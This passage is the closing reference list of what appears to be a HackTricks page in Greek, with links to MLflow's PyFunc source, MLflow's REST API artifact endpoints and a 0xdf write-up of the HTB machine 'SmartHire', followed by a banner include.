- [18] [Πηγαίος κώδικας MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [REST API του MLflow – endpoints λήψης και αποστολής artifact](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
